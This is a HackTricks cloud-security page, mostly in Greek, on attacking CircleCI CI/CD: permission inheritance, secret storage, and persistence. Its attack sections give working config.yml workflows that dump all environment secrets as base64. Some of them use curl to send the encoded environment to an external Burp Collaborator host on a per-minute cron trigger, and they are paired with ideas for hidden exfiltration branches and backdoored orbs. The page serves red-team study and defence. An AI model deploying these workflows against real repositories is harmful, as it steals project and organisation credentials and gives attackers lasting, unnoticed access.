# CircleCI Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) είναι μια πλατφόρμα Συνεχούς Ενσωμάτωσης όπου μπορείτε να **ορίσετε πρότυπα** που υποδεικνύουν τι θέλετε να κάνει με κάποιον κώδικα και πότε να το κάνει. Με αυτόν τον τρόπο μπορείτε να **αυτοματοποιήσετε τις δοκιμές** ή **τις αναπτύξεις** απευθείας **από το κύριο branch του repo σας** για παράδειγμα.

### Permissions

**CircleCI** **κληρονομεί τις άδειες** από το github και το bitbucket που σχετίζονται με τον **λογαριασμό** που συνδέεται.\
Στις δοκιμές μου, διαπίστωσα ότι όσο έχετε **δικαιώματα εγγραφής πάνω στο repo στο github**, θα μπορείτε να **διαχειριστείτε τις ρυθμίσεις του έργου σας στο CircleCI** (να ορίσετε νέα ssh keys, να αποκτήσετε project api keys, να δημιουργήσετε νέα branches με νέες ρυθμίσεις CircleCI...).

Ωστόσο, πρέπει να είστε **διαχειριστής του repo** για να **μετατρέψετε το repo σε έργο CircleCI**.

### Env Variables & Secrets

Σύμφωνα με [**τα έγγραφα**](https://circleci.com/docs/2.0/env-vars/) υπάρχουν διάφοροι τρόποι για να **φορτώσετε τιμές σε μεταβλητές περιβάλλοντος** μέσα σε μια ροή εργασίας.

#### Built-in env variables

Κάθε κοντέινερ που εκτελείται από το CircleCI θα έχει πάντα [**συγκεκριμένες env vars που ορίζονται στην τεκμηρίωση**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) όπως `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` ή `CIRCLE_USERNAME`.

#### Clear text

Μπορείτε να τις δηλώσετε σε καθαρό κείμενο μέσα σε μια **εντολή**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Μπορείτε να τα δηλώσετε σε καθαρό κείμενο μέσα στο **run environment**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Μπορείτε να τα δηλώσετε σε καθαρό κείμενο μέσα στο **build-job environment**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Μπορείτε να τα δηλώσετε σε καθαρό κείμενο μέσα στο **περιβάλλον ενός κοντέινερ**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
#### Project Secrets

Αυτά είναι **μυστικά** που θα είναι **προσβάσιμα** μόνο από το **έργο** (από **οποιοδήποτε κλάδο**).\
Μπορείτε να τα δείτε **δηλωμένα στο** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
Η λειτουργία "**Import Variables**" επιτρέπει την **εισαγωγή μεταβλητών από άλλα έργα** σε αυτό.
{% endhint %}

#### Context Secrets

Αυτά είναι μυστικά που είναι **σε επίπεδο οργανισμού**. Από **προεπιλογή, οποιοδήποτε repo** θα μπορεί να **προσπελάσει οποιοδήποτε μυστικό** αποθηκεύεται εδώ:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Ωστόσο, σημειώστε ότι μια διαφορετική ομάδα (αντί για Όλα τα μέλη) μπορεί να **επιλεγεί για να δώσει πρόσβαση στα μυστικά μόνο σε συγκεκριμένα άτομα**.\
Αυτό είναι αυτή τη στιγμή ένας από τους καλύτερους τρόπους για να **αυξήσετε την ασφάλεια των μυστικών**, ώστε να μην επιτρέπεται σε όλους να τα προσπελάσουν αλλά μόνο σε ορισμένα άτομα.
{% endhint %}

### Attacks

#### Search Clear Text Secrets

Αν έχετε **πρόσβαση στο VCS** (όπως το github) ελέγξτε το αρχείο `.circleci/config.yml` **κάθε repo σε κάθε κλάδο** και **αναζητήστε** πιθανά **μυστικά σε καθαρό κείμενο** που είναι αποθηκευμένα εκεί.

#### Secret Env Vars & Context enumeration

Ελέγχοντας τον κώδικα μπορείτε να βρείτε **όλα τα ονόματα των μυστικών** που χρησιμοποιούνται σε κάθε αρχείο `.circleci/config.yml`. Μπορείτε επίσης να αποκτήσετε τα **ονόματα των συμφραζομένων** από αυτά τα αρχεία ή να τα ελέγξετε στην διαδικτυακή κονσόλα: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

#### Exfiltrate Project secrets

{% hint style="warning" %}
Για να **εξάγετε ΟΛΑ** τα μυστικά του έργου και του συμφραζομένου **ΧΡΕΙΑΖΕΤΑΙ** απλώς να έχετε **ΓΡΑΦΗ** πρόσβαση σε **μόνο 1 repo** σε ολόκληρο τον οργανισμό github (_και ο λογαριασμός σας πρέπει να έχει πρόσβαση στα συμφραζόμενα αλλά από προεπιλογή όλοι μπορούν να έχουν πρόσβαση σε κάθε συμφραζόμενο_).
{% endhint %}

{% hint style="danger" %}
Η λειτουργία "**Import Variables**" επιτρέπει την **εισαγωγή μεταβλητών από άλλα έργα** σε αυτό. Επομένως, ένας επιτιθέμενος θα μπορούσε να **εισαγάγει όλες τις μεταβλητές του έργου από όλα τα repos** και στη συνέχεια να **εξάγει όλες μαζί**.
{% endhint %}

Όλα τα μυστικά του έργου είναι πάντα ρυθμισμένα στο env των εργασιών, οπότε απλώς καλώντας το env και αποκρύπτοντάς το σε base64 θα εξάγει τα μυστικά στην **κονσόλα καταγραφής διαδικασιών**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Αν **δεν έχετε πρόσβαση στην κονσόλα ιστού** αλλά έχετε **πρόσβαση στο repo** και γνωρίζετε ότι χρησιμοποιείται το CircleCI, μπορείτε απλά να **δημιουργήσετε μια ροή εργασίας** που **ενεργοποιείται κάθε λεπτό** και που **εξάγει τα μυστικά σε μια εξωτερική διεύθυνση**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
#### Εξαγωγή Μυστικών Πλαισίου

Πρέπει να **καθορίσετε το όνομα του πλαισίου** (αυτό θα εξάγει επίσης τα μυστικά του έργου):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Αν **δεν έχετε πρόσβαση στην κονσόλα ιστού** αλλά έχετε **πρόσβαση στο repo** και γνωρίζετε ότι χρησιμοποιείται το CircleCI, μπορείτε απλά να **τροποποιήσετε μια ροή εργασίας** που **ενεργοποιείται κάθε λεπτό** και που **εξάγει τα μυστικά σε μια εξωτερική διεύθυνση**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Απλά η δημιουργία ενός νέου `.circleci/config.yml` σε ένα repo **δεν είναι αρκετή για να ενεργοποιήσει μια κατασκευή circleci**. Πρέπει να **το ενεργοποιήσετε ως έργο στην κονσόλα circleci**.
{% endhint %}

#### Διαφυγή στο Cloud

**CircleCI** σας δίνει την επιλογή να εκτελείτε **τις κατασκευές σας στις μηχανές τους ή στις δικές σας**.\
Από προεπιλογή, οι μηχανές τους βρίσκονται στο GCP, και αρχικά δεν θα μπορείτε να βρείτε τίποτα σχετικό. Ωστόσο, αν ένα θύμα εκτελεί τις εργασίες στις **δικές του μηχανές (πιθανώς, σε ένα περιβάλλον cloud)**, μπορεί να βρείτε ένα **endpoint μεταδεδομένων cloud με ενδιαφέροντες πληροφορίες πάνω του**.

Σημειώστε ότι στα προηγούμενα παραδείγματα όλα εκτοξεύτηκαν μέσα σε ένα κοντέινερ docker, αλλά μπορείτε επίσης να **ζητήσετε να εκτοξευθεί μια μηχανή VM** (η οποία μπορεί να έχει διαφορετικές άδειες cloud):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Ή ακόμα και ένα docker container με πρόσβαση σε μια απομακρυσμένη υπηρεσία docker:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
#### Persistence

* Είναι δυνατόν να **δημιουργήσετε** **tokens χρηστών στο CircleCI** για να έχετε πρόσβαση στα API endpoints με την πρόσβαση των χρηστών.
* _https://app.circleci.com/settings/user/tokens_
* Είναι δυνατόν να **δημιουργήσετε tokens έργων** για να έχετε πρόσβαση στο έργο με τις άδειες που δίνονται στο token.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Είναι δυνατόν να **προσθέσετε SSH κλειδιά** στα έργα.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Είναι δυνατόν να **δημιουργήσετε μια cron job σε κρυφό branch** σε ένα απροσδόκητο έργο που **διαρρέει** όλες τις **μεταβλητές περιβάλλοντος** καθημερινά.
* Ή ακόμα και να δημιουργήσετε σε ένα branch / να τροποποιήσετε μια γνωστή εργασία που θα **διαρρέει** όλα τα context και τα **μυστικά έργων** καθημερινά.
* Αν είστε ιδιοκτήτης του github μπορείτε να **επιτρέψετε μη επαληθευμένα orbs** και να ρυθμίσετε ένα σε μια εργασία ως **backdoor**.
* Μπορείτε να βρείτε μια **ευπάθεια εκτέλεσης εντολών** σε κάποια εργασία και να **εισάγετε εντολές** μέσω ενός **μυστικού** τροποποιώντας την τιμή του.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
